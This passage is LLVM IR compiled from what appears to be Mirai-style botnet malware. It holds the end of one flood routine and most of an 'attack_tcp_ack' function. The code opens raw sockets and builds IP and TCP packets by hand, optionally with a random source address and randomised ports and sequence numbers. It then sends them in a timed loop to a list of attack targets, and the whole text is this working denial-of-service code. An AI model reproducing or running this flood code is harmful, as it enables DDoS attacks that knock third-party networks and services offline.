  %332 = load i32, i32* %11, align 4
  %333 = sext i32 %332 to i64
  %334 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %331, i64 %333
  %335 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %334, i32 0, i32 2
  %336 = load i8, i8* %335, align 4
  %337 = zext i8 %336 to i32
  %338 = lshr i32 %330, %337
  %339 = add i32 %329, %338
  %340 = call i32 @htonl(i32 %339) #7
  %341 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %342 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %341, i32 0, i32 9
  store i32 %340, i32* %342, align 4
  br label %343

; <label>:343:                                    ; preds = %322, %303
  %344 = load i32, i32* %28, align 4
  %345 = icmp eq i32 %344, -1
  br i1 %345, label %346, label %350

; <label>:346:                                    ; preds = %343
  %347 = call i32 @rand_next()
  %348 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %349 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %348, i32 0, i32 8
  store i32 %347, i32* %349, align 4
  br label %350

; <label>:350:                                    ; preds = %346, %343
  %351 = load i16, i16* %15, align 2
  %352 = zext i16 %351 to i32
  %353 = icmp eq i32 %352, 65535
  br i1 %353, label %354, label %360

; <label>:354:                                    ; preds = %350
  %355 = call i32 @rand_next()
  %356 = and i32 %355, 65535
  %357 = trunc i32 %356 to i16
  %358 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %359 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %358, i32 0, i32 3
  store i16 %357, i16* %359, align 4
  br label %360

; <label>:360:                                    ; preds = %354, %350
  %361 = load i16, i16* %18, align 2
  %362 = zext i16 %361 to i32
  %363 = icmp eq i32 %362, 65535
  br i1 %363, label %364, label %370

; <label>:364:                                    ; preds = %360
  %365 = call i32 @rand_next()
  %366 = and i32 %365, 65535
  %367 = trunc i32 %366 to i16
  %368 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %369 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %368, i32 0, i32 0
  store i16 %367, i16* %369, align 4
  br label %370

; <label>:370:                                    ; preds = %364, %360
  %371 = load i16, i16* %19, align 2
  %372 = zext i16 %371 to i32
  %373 = icmp eq i32 %372, 65535
  br i1 %373, label %374, label %380

; <label>:374:                                    ; preds = %370
  %375 = call i32 @rand_next()
  %376 = and i32 %375, 65535
  %377 = trunc i32 %376 to i16
  %378 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %379 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %378, i32 0, i32 1
  store i16 %377, i16* %379, align 2
  br label %380

; <label>:380:                                    ; preds = %374, %370
  %381 = load i32, i32* %20, align 4
  %382 = icmp eq i32 %381, 65535
  br i1 %382, label %383, label %387

; <label>:383:                                    ; preds = %380
  %384 = call i32 @rand_next()
  %385 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %386 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %385, i32 0, i32 2
  store i32 %384, i32* %386, align 4
  br label %387

; <label>:387:                                    ; preds = %383, %380
  %388 = load i32, i32* %21, align 4
  %389 = icmp eq i32 %388, 65535
  br i1 %389, label %390, label %394

; <label>:390:                                    ; preds = %387
  %391 = call i32 @rand_next()
  %392 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %393 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %392, i32 0, i32 3
  store i32 %391, i32* %393, align 4
  br label %394

; <label>:394:                                    ; preds = %390, %387
  %395 = load i8, i8* %22, align 1
  %396 = icmp ne i8 %395, 0
  br i1 %396, label %397, label %403

; <label>:397:                                    ; preds = %394
  %398 = call i32 @rand_next()
  %399 = and i32 %398, 65535
  %400 = trunc i32 %399 to i16
  %401 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %402 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %401, i32 0, i32 7
  store i16 %400, i16* %402, align 2
  br label %403

; <label>:403:                                    ; preds = %397, %394
  %404 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %405 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %404, i32 0, i32 7
  store i16 0, i16* %405, align 2
  %406 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %407 = bitcast %struct.iphdr* %406 to i16*
  %408 = call zeroext i16 @checksum_generic(i16* %407, i32 20)
  %409 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %410 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %409, i32 0, i32 7
  store i16 %408, i16* %410, align 2
  %411 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %412 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %411, i32 0, i32 6
  store i16 0, i16* %412, align 4
  %413 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %414 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %415 = bitcast %struct.tcphdr* %414 to i8*
  %416 = call zeroext i16 @htons(i16 zeroext 40) #7
  %417 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %413, i8* %415, i16 zeroext %416, i32 40)
  %418 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %419 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %418, i32 0, i32 6
  store i16 %417, i16* %419, align 4
  %420 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %421 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %420, i32 0, i32 1
  %422 = load i16, i16* %421, align 2
  %423 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %424 = load i32, i32* %11, align 4
  %425 = sext i32 %424 to i64
  %426 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %423, i64 %425
  %427 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %426, i32 0, i32 0
  %428 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %427, i32 0, i32 1
  store i16 %422, i16* %428, align 2
  %429 = load i32, i32* %12, align 4
  %430 = load i8*, i8** %33, align 8
  %431 = bitcast %union.__CONST_SOCKADDR_ARG* %36 to %struct.sockaddr**
  %432 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %433 = load i32, i32* %11, align 4
  %434 = sext i32 %433 to i64
  %435 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %432, i64 %434
  %436 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %435, i32 0, i32 0
  %437 = bitcast %struct.sockaddr_in* %436 to %struct.sockaddr*
  store %struct.sockaddr* %437, %struct.sockaddr** %431, align 8
  %438 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %36, i32 0, i32 0
  %439 = load %struct.sockaddr*, %struct.sockaddr** %438, align 8
  %440 = call i64 @sendto(i32 %429, i8* %430, i64 60, i32 16384, %struct.sockaddr* %439, i32 16)
  br label %441

; <label>:441:                                    ; preds = %403
  %442 = load i32, i32* %11, align 4
  %443 = add nsw i32 %442, 1
  store i32 %443, i32* %11, align 4
  br label %298

; <label>:444:                                    ; preds = %298
  %445 = call i64 @time(i64* null) #6
  %446 = load i32, i32* %29, align 4
  %447 = sext i32 %446 to i64
  %448 = icmp sgt i64 %445, %447
  br i1 %448, label %449, label %450

; <label>:449:                                    ; preds = %444
  br label %451

; <label>:450:                                    ; preds = %444
  br label %297

; <label>:451:                                    ; preds = %449, %112, %106
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_ack(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i8, align 1
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
  %29 = alloca i8, align 1
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca %struct.iphdr*, align 8
  %33 = alloca %struct.tcphdr*, align 8
  %34 = alloca i8*, align 8
  %35 = alloca i8*, align 8
  %36 = alloca %struct.iphdr*, align 8
  %37 = alloca %struct.tcphdr*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %40 = load i8, i8* %7, align 1
  %41 = zext i8 %40 to i64
  %42 = call noalias i8* @calloc(i64 %41, i64 8) #6
  %43 = bitcast i8* %42 to i8**
  store i8** %43, i8*** %13, align 8
  %44 = load i8, i8* %9, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %46 = call i32 @attack_get_opt_int(i8 zeroext %44, %struct.attack_option* %45, i8 zeroext 2, i32 0)
  %47 = trunc i32 %46 to i8
  store i8 %47, i8* %14, align 1
  %48 = load i8, i8* %9, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 3, i32 65535)
  %51 = trunc i32 %50 to i16
  store i16 %51, i16* %15, align 2
  %52 = load i8, i8* %9, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 4, i32 64)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %16, align 1
  %56 = load i8, i8* %9, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 5, i32 0)
  %59 = trunc i32 %58 to i8
  store i8 %59, i8* %17, align 1
  %60 = load i8, i8* %9, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 6, i32 65535)
  %63 = trunc i32 %62 to i16
  store i16 %63, i16* %18, align 2
  %64 = load i8, i8* %9, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 7, i32 65535)
  %67 = trunc i32 %66 to i16
  store i16 %67, i16* %19, align 2
  %68 = load i8, i8* %9, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 16, i32 65535)
  store i32 %70, i32* %20, align 4
  %71 = load i8, i8* %9, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 17, i32 65535)
  store i32 %73, i32* %21, align 4
  %74 = load i8, i8* %9, align 1
  %75 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %76 = call i32 @attack_get_opt_int(i8 zeroext %74, %struct.attack_option* %75, i8 zeroext 10, i32 0)
  %77 = trunc i32 %76 to i8
  store i8 %77, i8* %22, align 1
  %78 = load i8, i8* %9, align 1
  %79 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %80 = call i32 @attack_get_opt_int(i8 zeroext %78, %struct.attack_option* %79, i8 zeroext 11, i32 1)
  %81 = trunc i32 %80 to i8
  store i8 %81, i8* %23, align 1
  %82 = load i8, i8* %9, align 1
  %83 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %84 = call i32 @attack_get_opt_int(i8 zeroext %82, %struct.attack_option* %83, i8 zeroext 12, i32 0)
  %85 = trunc i32 %84 to i8
  store i8 %85, i8* %24, align 1
  %86 = load i8, i8* %9, align 1
  %87 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %88 = call i32 @attack_get_opt_int(i8 zeroext %86, %struct.attack_option* %87, i8 zeroext 13, i32 0)
  %89 = trunc i32 %88 to i8
  store i8 %89, i8* %25, align 1
  %90 = load i8, i8* %9, align 1
  %91 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %92 = call i32 @attack_get_opt_int(i8 zeroext %90, %struct.attack_option* %91, i8 zeroext 14, i32 0)
  %93 = trunc i32 %92 to i8
  store i8 %93, i8* %26, align 1
  %94 = load i8, i8* %9, align 1
  %95 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %96 = call i32 @attack_get_opt_int(i8 zeroext %94, %struct.attack_option* %95, i8 zeroext 15, i32 0)
  %97 = trunc i32 %96 to i8
  store i8 %97, i8* %27, align 1
  %98 = load i8, i8* %9, align 1
  %99 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %100 = call i32 @attack_get_opt_int(i8 zeroext %98, %struct.attack_option* %99, i8 zeroext 0, i32 512)
  store i32 %100, i32* %28, align 4
  %101 = load i8, i8* %9, align 1
  %102 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %103 = call i32 @attack_get_opt_int(i8 zeroext %101, %struct.attack_option* %102, i8 zeroext 1, i32 1)
  %104 = trunc i32 %103 to i8
  store i8 %104, i8* %29, align 1
  %105 = load i8, i8* %9, align 1
  %106 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %107 = load i32, i32* @LOCAL_ADDR, align 4
  %108 = call i32 @attack_get_opt_ip(i8 zeroext %105, %struct.attack_option* %106, i8 zeroext 24, i32 %107)
  store i32 %108, i32* %30, align 4
  %109 = call i64 @time(i64* null) #6
  %110 = load i32, i32* %6, align 4
  %111 = sext i32 %110 to i64
  %112 = add nsw i64 %109, %111
  %113 = trunc i64 %112 to i32
  store i32 %113, i32* %31, align 4
  %114 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %114, i32* %12, align 4
  %115 = icmp eq i32 %114, -1
  br i1 %115, label %116, label %117

; <label>:116:                                    ; preds = %5
  br label %462

; <label>:117:                                    ; preds = %5
  store i32 1, i32* %11, align 4
  %118 = load i32, i32* %12, align 4
  %119 = bitcast i32* %11 to i8*
  %120 = call i32 @setsockopt(i32 %118, i32 0, i32 3, i8* %119, i32 4) #6
  %121 = icmp eq i32 %120, -1
  br i1 %121, label %122, label %125

; <label>:122:                                    ; preds = %117
  %123 = load i32, i32* %12, align 4
  %124 = call i32 @close(i32 %123)
  br label %462

; <label>:125:                                    ; preds = %117
  store i32 0, i32* %11, align 4
  br label %126

; <label>:126:                                    ; preds = %289, %125
  %127 = load i32, i32* %11, align 4
  %128 = load i8, i8* %7, align 1
  %129 = zext i8 %128 to i32
  %130 = icmp slt i32 %127, %129
  br i1 %130, label %131, label %292

; <label>:131:                                    ; preds = %126
  %132 = call noalias i8* @calloc(i64 1510, i64 1) #6
  %133 = load i8**, i8*** %13, align 8
  %134 = load i32, i32* %11, align 4
  %135 = sext i32 %134 to i64
  %136 = getelementptr inbounds i8*, i8** %133, i64 %135
  store i8* %132, i8** %136, align 8
  %137 = load i8**, i8*** %13, align 8
  %138 = load i32, i32* %11, align 4
  %139 = sext i32 %138 to i64
  %140 = getelementptr inbounds i8*, i8** %137, i64 %139
  %141 = load i8*, i8** %140, align 8
  %142 = bitcast i8* %141 to %struct.iphdr*
  store %struct.iphdr* %142, %struct.iphdr** %32, align 8
  %143 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %144 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %143, i64 1
  %145 = bitcast %struct.iphdr* %144 to %struct.tcphdr*
  store %struct.tcphdr* %145, %struct.tcphdr** %33, align 8
  %146 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %147 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %146, i64 1
  %148 = bitcast %struct.tcphdr* %147 to i8*
  store i8* %148, i8** %34, align 8
  %149 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %150 = bitcast %struct.iphdr* %149 to i8*
  %151 = load i8, i8* %150, align 4
  %152 = and i8 %151, 15
  %153 = or i8 %152, 64
  store i8 %153, i8* %150, align 4
  %154 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %155 = bitcast %struct.iphdr* %154 to i8*
  %156 = load i8, i8* %155, align 4
  %157 = and i8 %156, -16
  %158 = or i8 %157, 5
  store i8 %158, i8* %155, align 4
  %159 = load i8, i8* %14, align 1
  %160 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %161 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %160, i32 0, i32 1
  store i8 %159, i8* %161, align 1
  %162 = load i32, i32* %28, align 4
  %163 = sext i32 %162 to i64
  %164 = add i64 40, %163
  %165 = trunc i64 %164 to i16
  %166 = call zeroext i16 @htons(i16 zeroext %165) #7
  %167 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %168 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %167, i32 0, i32 2
  store i16 %166, i16* %168, align 2
  %169 = load i16, i16* %15, align 2
  %170 = call zeroext i16 @htons(i16 zeroext %169) #7
  %171 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %172 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %171, i32 0, i32 3
  store i16 %170, i16* %172, align 4
  %173 = load i8, i8* %16, align 1
  %174 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %175 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %174, i32 0, i32 5
  store i8 %173, i8* %175, align 4
  %176 = load i8, i8* %17, align 1
  %177 = icmp ne i8 %176, 0
  br i1 %177, label %178, label %182

; <label>:178:                                    ; preds = %131
  %179 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %180 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %181 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %180, i32 0, i32 4
  store i16 %179, i16* %181, align 2
  br label %182

; <label>:182:                                    ; preds = %178, %131
  %183 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %184 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %183, i32 0, i32 6
  store i8 6, i8* %184, align 1
  %185 = load i32, i32* %30, align 4
  %186 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %187 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %186, i32 0, i32 8
  store i32 %185, i32* %187, align 4
  %188 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %189 = load i32, i32* %11, align 4
  %190 = sext i32 %189 to i64
  %191 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %188, i64 %190
  %192 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %191, i32 0, i32 1
  %193 = load i32, i32* %192, align 4
  %194 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %195 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %194, i32 0, i32 9
  store i32 %193, i32* %195, align 4
  %196 = load i16, i16* %18, align 2
  %197 = call zeroext i16 @htons(i16 zeroext %196) #7
  %198 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %199 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %198, i32 0, i32 0
  store i16 %197, i16* %199, align 4
  %200 = load i16, i16* %19, align 2
  %201 = call zeroext i16 @htons(i16 zeroext %200) #7
  %202 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %203 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %202, i32 0, i32 1
  store i16 %201, i16* %203, align 2
  %204 = load i32, i32* %20, align 4
  %205 = trunc i32 %204 to i16
  %206 = call zeroext i16 @htons(i16 zeroext %205) #7
  %207 = zext i16 %206 to i32
  %208 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %209 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %208, i32 0, i32 2
  store i32 %207, i32* %209, align 4
  %210 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %211 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %210, i32 0, i32 4
  %212 = load i16, i16* %211, align 4
  %213 = and i16 %212, -241
  %214 = or i16 %213, 80
  store i16 %214, i16* %211, align 4
  %215 = load i8, i8* %22, align 1
  %216 = sext i8 %215 to i16
  %217 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %218 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %217, i32 0, i32 4
  %219 = load i16, i16* %218, align 4
  %220 = and i16 %216, 1
  %221 = shl i16 %220, 13
  %222 = and i16 %219, -8193
  %223 = or i16 %222, %221
  store i16 %223, i16* %218, align 4
  %224 = load i8, i8* %23, align 1
  %225 = sext i8 %224 to i16
  %226 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %227 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %226, i32 0, i32 4
  %228 = load i16, i16* %227, align 4
  %229 = and i16 %225, 1
  %230 = shl i16 %229, 12
  %231 = and i16 %228, -4097
  %232 = or i16 %231, %230
  store i16 %232, i16* %227, align 4
  %233 = load i8, i8* %24, align 1
  %234 = sext i8 %233 to i16
  %235 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %236 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %235, i32 0, i32 4
  %237 = load i16, i16* %236, align 4
  %238 = and i16 %234, 1
  %239 = shl i16 %238, 11
  %240 = and i16 %237, -2049
  %241 = or i16 %240, %239
  store i16 %241, i16* %236, align 4
  %242 = load i8, i8* %25, align 1
  %243 = sext i8 %242 to i16
  %244 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %245 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %244, i32 0, i32 4
  %246 = load i16, i16* %245, align 4
  %247 = and i16 %243, 1
  %248 = shl i16 %247, 10
  %249 = and i16 %246, -1025
  %250 = or i16 %249, %248
  store i16 %250, i16* %245, align 4
  %251 = load i8, i8* %26, align 1
  %252 = sext i8 %251 to i16
  %253 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %254 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %253, i32 0, i32 4
  %255 = load i16, i16* %254, align 4
  %256 = and i16 %252, 1
  %257 = shl i16 %256, 9
  %258 = and i16 %255, -513
  %259 = or i16 %258, %257
  store i16 %259, i16* %254, align 4
  %260 = load i8, i8* %27, align 1
  %261 = sext i8 %260 to i16
  %262 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %263 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %262, i32 0, i32 4
  %264 = load i16, i16* %263, align 4
  %265 = and i16 %261, 1
  %266 = shl i16 %265, 8
  %267 = and i16 %264, -257
  %268 = or i16 %267, %266
  store i16 %268, i16* %263, align 4
  %269 = call i32 @rand_next()
  %270 = and i32 %269, 65535
  %271 = trunc i32 %270 to i16
  %272 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %273 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %272, i32 0, i32 5
  store i16 %271, i16* %273, align 2
  %274 = load i8, i8* %24, align 1
  %275 = icmp ne i8 %274, 0
  br i1 %275, label %276, label %282

; <label>:276:                                    ; preds = %182
  %277 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %278 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %277, i32 0, i32 4
  %279 = load i16, i16* %278, align 4
  %280 = and i16 %279, -2049
  %281 = or i16 %280, 2048
  store i16 %281, i16* %278, align 4
  br label %282

; <label>:282:                                    ; preds = %276, %182
  %283 = load i8*, i8** %34, align 8
  %284 = load i32, i32* %28, align 4
  call void @rand_alphastr(i8* %283, i32 %284)
  %285 = load i8*, i8** %34, align 8
  %286 = load i32, i32* %28, align 4
  %287 = sext i32 %286 to i64
  %288 = getelementptr inbounds i8, i8* %285, i64 %287
  store i8 0, i8* %288, align 1
  br label %289

; <label>:289:                                    ; preds = %282
  %290 = load i32, i32* %11, align 4
  %291 = add nsw i32 %290, 1
  store i32 %291, i32* %11, align 4
  br label %126

; <label>:292:                                    ; preds = %126
  br label %293

; <label>:293:                                    ; preds = %461, %292
  store i32 0, i32* %11, align 4
  br label %294

; <label>:294:                                    ; preds = %452, %293
  %295 = load i32, i32* %11, align 4
  %296 = load i8, i8* %7, align 1
  %297 = zext i8 %296 to i32
  %298 = icmp slt i32 %295, %297
  br i1 %298, label %299, label %455

; <label>:299:                                    ; preds = %294
  %300 = load i8**, i8*** %13, align 8
  %301 = load i32, i32* %11, align 4
  %302 = sext i32 %301 to i64
  %303 = getelementptr inbounds i8*, i8** %300, i64 %302
  %304 = load i8*, i8** %303, align 8
  store i8* %304, i8** %35, align 8
  %305 = load i8*, i8** %35, align 8
  %306 = bitcast i8* %305 to %struct.iphdr*
  store %struct.iphdr* %306, %struct.iphdr** %36, align 8
  %307 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %308 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %307, i64 1
  %309 = bitcast %struct.iphdr* %308 to %struct.tcphdr*
  store %struct.tcphdr* %309, %struct.tcphdr** %37, align 8
  %310 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %311 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %310, i64 1
  %312 = bitcast %struct.tcphdr* %311 to i8*
  store i8* %312, i8** %38, align 8
  %313 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %314 = load i32, i32* %11, align 4
  %315 = sext i32 %314 to i64
  %316 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %313, i64 %315
  %317 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %316, i32 0, i32 2
  %318 = load i8, i8* %317, align 4
  %319 = zext i8 %318 to i32
  %320 = icmp slt i32 %319, 32
  br i1 %320, label %321, label %342

; <label>:321:                                    ; preds = %299
  %322 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %323 = load i32, i32* %11, align 4
  %324 = sext i32 %323 to i64
  %325 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %322, i64 %324
  %326 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %325, i32 0, i32 1
  %327 = load i32, i32* %326, align 4
  %328 = call i32 @ntohl(i32 %327) #7
  %329 = call i32 @rand_next()
  %330 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %331 = load i32, i32* %11, align 4
  %332 = sext i32 %331 to i64
  %333 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %330, i64 %332
  %334 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %333, i32 0, i32 2
  %335 = load i8, i8* %334, align 4
  %336 = zext i8 %335 to i32
  %337 = lshr i32 %329, %336
  %338 = add i32 %328, %337
  %339 = call i32 @htonl(i32 %338) #7
  %340 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %341 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %340, i32 0, i32 9
  store i32 %339, i32* %341, align 4
  br label %342

; <label>:342:                                    ; preds = %321, %299
  %343 = load i32, i32* %30, align 4
  %344 = icmp eq i32 %343, -1
  br i1 %344, label %345, label %349

; <label>:345:                                    ; preds = %342
  %346 = call i32 @rand_next()
  %347 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %348 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %347, i32 0, i32 8
  store i32 %346, i32* %348, align 4
  br label %349

; <label>:349:                                    ; preds = %345, %342
  %350 = load i16, i16* %15, align 2
  %351 = zext i16 %350 to i32
  %352 = icmp eq i32 %351, 65535
  br i1 %352, label %353, label %359

; <label>:353:                                    ; preds = %349
  %354 = call i32 @rand_next()
  %355 = and i32 %354, 65535
  %356 = trunc i32 %355 to i16
  %357 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %358 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %357, i32 0, i32 3
  store i16 %356, i16* %358, align 4
  br label %359

; <label>:359:                                    ; preds = %353, %349
  %360 = load i16, i16* %18, align 2
  %361 = zext i16 %360 to i32
  %362 = icmp eq i32 %361, 65535
  br i1 %362, label %363, label %369

; <label>:363:                                    ; preds = %359
  %364 = call i32 @rand_next()
  %365 = and i32 %364, 65535
  %366 = trunc i32 %365 to i16
  %367 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %368 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %367, i32 0, i32 0
  store i16 %366, i16* %368, align 4
  br label %369

; <label>:369:                                    ; preds = %363, %359
  %370 = load i16, i16* %19, align 2
  %371 = zext i16 %370 to i32
  %372 = icmp eq i32 %371, 65535
  br i1 %372, label %373, label %379

; <label>:373:                                    ; preds = %369
  %374 = call i32 @rand_next()
  %375 = and i32 %374, 65535
  %376 = trunc i32 %375 to i16
  %377 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %378 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %377, i32 0, i32 1
  store i16 %376, i16* %378, align 2
  br label %379

; <label>:379:                                    ; preds = %373, %369
  %380 = load i32, i32* %20, align 4
  %381 = icmp eq i32 %380, 65535
  br i1 %381, label %382, label %386

; <label>:382:                                    ; preds = %379
  %383 = call i32 @rand_next()
  %384 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %385 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %384, i32 0, i32 2
  store i32 %383, i32* %385, align 4
  br label %386

